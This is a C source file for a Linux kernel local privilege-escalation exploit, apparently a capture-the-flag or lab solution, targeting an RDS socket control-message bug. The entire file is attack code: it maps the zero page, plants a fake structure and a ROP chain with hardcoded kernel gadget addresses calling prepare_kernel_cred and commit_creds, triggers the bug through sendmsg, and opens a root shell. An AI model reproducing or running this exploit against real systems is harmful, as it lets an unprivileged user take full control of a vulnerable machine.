// sysctl -w vm.mmap_min_addr=0
// gcc -O3 -pthread -static -g -masm=intel ./exploit.c -o exploit
#define _GNU_SOURCE
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <linux/perf_event.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>

#define RAND_SIZE 4096

#ifndef SOL_RDS
#define SOL_RDS 276
#endif
#ifndef RDS_CMSG_MASKED_ATOMIC_CSWP
#define RDS_CMSG_MASKED_ATOMIC_CSWP 9
#endif
#ifndef AF_RDS
#define AF_RDS 0x15
#endif

void trigger_bug()
{
  struct sockaddr_in sin;
  struct msghdr msg;
  char buf[RAND_SIZE];
  struct cmsghdr cmsg;

  memset(&sin, 0, sizeof(struct sockaddr));
  memset(&msg, 0, sizeof(msg));
  memset(buf, 0x40, sizeof(buf));
  memset(&cmsg, 0, sizeof(cmsg));

  int fd = socket(AF_RDS, 5, 0);
  if (fd < 0)
  {
    printf("[-] socket(AF_RDS): %m\n");
    return;
  }

  sin.sin_family = AF_INET;
  sin.sin_port = htons(2000);
  sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

  bind(fd, (struct sockaddr *)&sin, sizeof(sin));

  cmsg.cmsg_len = RAND_SIZE;
  cmsg.cmsg_type = RDS_CMSG_MASKED_ATOMIC_CSWP;
  cmsg.cmsg_level = SOL_RDS;

  memcpy(&buf[0], &cmsg, sizeof(cmsg));

  *(uint64_t *)(buf + 0x18) = 0x40404000; /* args->local_addr */

  msg.msg_name = &sin;
  msg.msg_namelen = sizeof(sin);
  msg.msg_iov = NULL;
  msg.msg_iovlen = 0;
  msg.msg_control = buf;
  msg.msg_controllen = RAND_SIZE;
  msg.msg_flags = MSG_DONTROUTE | MSG_PROXY | MSG_WAITALL;

  syscall(SYS_sendmsg, fd, &msg, 0);
}

void mmap_page(u_int64_t _addr, size_t _len)
{
  void *addr = mmap((void *)_addr, _len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
  printf("mmap(%p)\n", addr);
  if (addr < 0)
  {
    perror("[!] Cannot mmap at null");
    exit(EXIT_FAILURE);
  }
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
  __asm__(
      "mov %cs, user_cs\n\t"
      "mov %ss, user_ss\n\t"
      "mov %rsp, user_sp\n\t"
      "pushf\n\t"
      "pop user_rflags\n\t");
  puts("[+]status has been saved.");
}

static void shell()
{
  if (getuid() == 0 && geteuid() == 0)
  {
    printf("[+] got root\n");
    system("/bin/sh");
  }
  else
  {
    printf("[-] failed\n");
  }
  exit(EXIT_FAILURE);
}

#define xchg 0xffffffff817069e8
#define pop_rdi 0xffffffff81051bdf
#define xchg_rdi_rax 0xffffffff810091a2
#define prepare_kernel_cred 0xffffffff81079440
#define commit_creds 0xffffffff810790c0
#define swapgs 0xffffffff8197fda1
#define iretq 0xffffffff81022b06

int main(int argc)
{
  save_status();
  // Step 1: map zero
  mmap_page(0, 0x1000);

  // Step 2: construct fake struct at 0
  static unsigned long result = 0x32;
  unsigned long *data = (unsigned long *)0;
  data[1] = (uint64_t)&result;
  data[3] = xchg;

  // Step 3: construct fake stack
  mmap_page(xchg & 0xfffff000, 0x1000);

  u_int64_t *stack_base = 0x817069e8;

  u_int64_t i = 0;
  *(stack_base + i++) = pop_rdi;
  *(stack_base + i++) = 0;
  *(stack_base + i++) = prepare_kernel_cred;
  *(stack_base + i++) = xchg_rdi_rax;
  *(stack_base + i++) = commit_creds;
  *(stack_base + i++) = swapgs;
  *(stack_base + i++) = iretq;
  *(stack_base + i++) = &shell;
  *(stack_base + i++) = user_cs;
  *(stack_base + i++) = user_rflags;
  *(stack_base + i++) = user_sp;
  *(stack_base + i++) = user_ss;

  // Step 4: tigger bug
  trigger_bug();
  return 0;
}